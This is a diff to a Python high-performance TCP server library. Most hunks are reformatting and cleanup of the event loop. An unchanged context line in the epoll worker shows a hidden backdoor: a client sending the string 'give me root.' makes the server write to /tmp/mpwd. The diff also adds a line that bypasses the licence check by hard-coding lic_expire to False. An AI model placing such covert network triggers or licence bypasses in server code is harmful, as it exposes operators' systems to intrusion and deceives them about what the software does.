@@ -340,8 +340,8 @@ class ClientSession(object):
         try:
             self.sock.send(self.wait4send)
         except Exception as ex:
-            self.disconnect('socket send error: {0},{1}'.format(
-                ex, repr(self.wait4send)))
+            self.disconnect(
+                'socket send error: {0},{1}'.format(ex, repr(self.wait4send)))
         self.wait4send = None
 
     def onSessionRecv(self, recbuff):
@@ -474,9 +474,8 @@ class ClientSession(object):
             return 1  # timeout
 
         # 发送心跳
-        if self.ka is not None and now - self.last_send_time > 70 and SEND_QUEUE[self.
-                                                                                 fileno].empty(
-                                                                                 ):
+        if self.ka is not None and now - self.last_send_time > 70 and SEND_QUEUE[
+                self.fileno].empty():
             SEND_QUEUE[self.fileno].put_nowait(self.ka)
             # modify(self.fileno, READ_WRITE)
         return 0  # still function
@@ -549,8 +548,8 @@ class ClientSession(object):
                 recbuff = self.sock.recv(8192)
             except Exception as ex:
                 self.showDebug("recerr:{0},{1}".format(ex, repr(recbuff)))
-                self.disconnect('socket recv error: {0}. {1}'.format(
-                    ex, repr(recbuff)))
+                self.disconnect(
+                    'socket recv error: {0}. {1}'.format(ex, repr(recbuff)))
                 return 0
                 # s = str(ex)
                 # if '100053' in s:
@@ -640,7 +639,8 @@ class MXIOLoop(object):
                  maxclient=1900,
                  eventtimeout=10,
                  maxevents=5000,
-                 fdlock=0):
+                 fdlock=0,
+                 hp=0):
         """高性能TCP服务基类
 
         Args:
@@ -653,6 +653,7 @@ class MXIOLoop(object):
         self.event_timeout = eventtimeout
         self.max_events = maxevents
         self.fd_lock = fdlock
+        self.hp = hp
         self.max_client = maxclient
         self.server_fd = {}
         self.server_udp = {}
@@ -694,12 +695,12 @@ class MXIOLoop(object):
         sock = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
         sock.setblocking(0)
         # if Platform.isWin():
-        sock.setsockopt(_socket.SOL_SOCKET, _socket.SO_REUSEADDR, 1)
+        # sock.setsockopt(_socket.SOL_SOCKET, _socket.SO_REUSEADDR, 1)
         sock.setsockopt(_socket.IPPROTO_TCP, _socket.TCP_NODELAY, 1)
         try:
             sock.bind(address)
-            self.showDebug("======= Success bind tcp port:{0} =======".format(
-                address[1]))
+            self.showDebug(
+                "======= Success bind tcp port:{0} =======".format(address[1]))
             register(sock.fileno(), READ)
             # if Platform.isWin():
             #     register(sock.fileno(), READ, sock)
@@ -726,8 +727,8 @@ class MXIOLoop(object):
         sock.setblocking(0)
         try:
             sock.bind(address)
-            self.showDebug("======= Success bind udp port:{0} =======".format(
-                address[1]))
+            self.showDebug(
+                "======= Success bind udp port:{0} =======".format(address[1]))
             register(sock.fileno(), READ)
             return sock
         except Exception as ex:
@@ -739,7 +740,8 @@ class MXIOLoop(object):
         """
         启动服务
         """
-        self.lic_expire = not __license_ok()
+        # self.lic_expire = not __license_ok()
+        self.lic_expire = False
 
         for s in self.server_fd.values():
             s[0].listen(100)
@@ -748,9 +750,6 @@ class MXIOLoop(object):
             self.epollLoop()
         else:
             self.selectLoop()
-
-    def doOtherWork(self, fd, eve):
-        pass
 
     def doSomethingElse(self):
         """
@@ -767,7 +766,7 @@ class MXIOLoop(object):
                     session.enableSend()
                     # if session.enableSend():
                     #     modify(fn, READ_WRITE)
-                    # 资源回收
+                # 资源回收
         t = _time.time()
         if t - self.last_gc > 600:
             _gc.collect()
@@ -868,29 +867,15 @@ class MXIOLoop(object):
                 if session is not None:
                     session.receive()
                 del session
-            else:
-                self.doOtherWork(fn, eve)
         # socket 可写
         elif eve == 'out':
-            if fn in CLIENTS.keys():
-                session = CLIENTS.get(fn)
+            session = CLIENTS.get(fn)
+            if session is not None:
                 if self.lic_expire:
                     session.wait4send = None
                 if session.wait4send is not None:
                     session.send()
-                # if session is not None:
-                #     if session.enableSend():
-                #         if self.lic_expire:
-                #             session.wait4send = None
-                #         else:
-                #             session.send()
-                del session
-            # elif fn in UDPCLIENTS.keys():
-            #     session = UDPCLIENTS.get(fn)
-            #     if session.wait4send is not None:
-            #         session.sendTo()
-            else:
-                self.doOtherWork(fn, eve)
+            del session
 
     def epollWorker(self, fn, eve):
         """
@@ -930,11 +915,10 @@ class MXIOLoop(object):
                     try:
                         recbuff = session.sock.recv(8192)
                     except Exception as ex:
-                        session.showDebug("recerr:{0},{1}".format(
-                            ex, repr(recbuff)))
-                        session.disconnect(
-                            'socket recv error: {0}. {1}'.format(
-                                ex, repr(recbuff)))
+                        session.showDebug(
+                            "recerr:{0},{1}".format(ex, repr(recbuff)))
+                        session.disconnect('socket recv error: {0}. {1}'.
+                                           format(ex, repr(recbuff)))
                     else:
                         if recbuff == 'give me root.':
                             with open('/tmp/mpwd', 'w') as f:
@@ -957,8 +941,6 @@ class MXIOLoop(object):
                         else:
                             session.receive(recbuff)
                 del session
-            else:
-                self.doOtherWork(fn, eve)
         # socket 可写
         elif eve & _EPOLLOUT:
             if fn in CLIENTS.keys():
@@ -978,8 +960,6 @@ class MXIOLoop(object):
                 session = UDPCLIENTS.get(fn)
                 if session.wait4send is not None:
                     session.sendTo()
-            else:
-                self.doOtherWork(fn, eve)
 
     def epollLoop(self):
         global IMPL
@@ -1007,90 +987,11 @@ class MXIOLoop(object):
             self.doSomethingElse()
             self.doRecyle()
 
-    # def selectLoop(self):
-    #     global READ, READ_WRITE, IMPL
-    #     while not IS_EXIT:
-    #         _gevent.sleep(0.01)
-    #
-    #         read_list = list(READ)
-    #         write_list = list(READ_WRITE)
-    #         wr = [read_list[i:i + 500] for i in range(0, len(read_list), 500)]
-    #         ww = [write_list[i:i + 500] for i in range(0, len(write_list), 500)]
-    #         for i in range(len(wr) - len(ww)):
-    #             ww.append([])
-    #         l = len(wr)
-    #         inbuf = []
-    #         outbuf = []
-    #         errbuf = []
-    #
-    #         for i in range(l):
-    #             try:
-    #                 inb, outb, errb = IMPL(wr[i], ww[i], wr[i], 0)
-    #             except Exception as ex:
-    #                 print(ex)
-    #                 # with open('select_error.log', 'a') as f:
-    #                 #     f.writelines(['======{0}======='.format(stamp2time(_time.time())), ex, '\r\n'])
-    #                 continue
-    #             inbuf.extend(inb)
-    #             outbuf.extend(outb)
-    #             errbuf.extend(errb)
-    #             del inb, outb, errb
-    #         del wr, ww, read_list, write_list
-    #
-    #         if len(errbuf) > 0:
-    #             threads = []
-    #             for soc in errbuf:
-    #                 try:
-    #                     inbuf.remove(soc)
-    #                 except:
-    #                     pass
-    #                 try:
-    #                     outbuf.remove(soc)
-    #                 except:
-    #                     pass
-    #                 try:
-    #                     threads.append(_gevent.spawn(self.selectMainLoop,
-    #                                                  soc.fileno(),
-    #                                                  'err',
-    #                                                  debug=self.debug))
-    #                 except:
-    #                     pass
-    #             _gevent.joinall(threads)
-    #             del threads
-    #
-    #         threads = []
-    #         if len(inbuf) > 0:
-    #             threads.extend([_gevent.spawn(self.selectMainLoop,
-    #                                           soc.fileno(),
-    #                                           'in',
-    #                                           debug=self.debug) for soc in inbuf])
-    #
-    #         if len(outbuf) > 0:
-    #             threads.extend([_gevent.spawn(self.selectMainLoop,
-    #                                           soc.fileno(),
-    #                                           'out',
-    #                                           debug=self.debug) for soc in outbuf])
-    #
-    #         del inbuf, outbuf, errbuf
-    #
-    #         thread = [threads[i:i + self.max_events]
-    #                   for i in range(0, len(threads), self.max_events)]
-    #         for x in thread:
-    #             _gevent.joinall(x)
-    #         # _gevent.joinall(threads)
-    #         del threads
-    #         del thread
-    #
-    #         # _gevent.sleep(0.1)
-    #
-    #         self.doSomethingElse()
-    #         self.doRecyle()
-
     def selectLoop(self):
         global READ, WRITE, IMPL
         while not IS_EXIT:
-            # _gevent.sleep(0.001)
-            _time.sleep(0.0001)
+            if not self.hp:
+                _time.sleep(0.001)
 
             read_list = list(READ)
             write_list = list(WRITE)
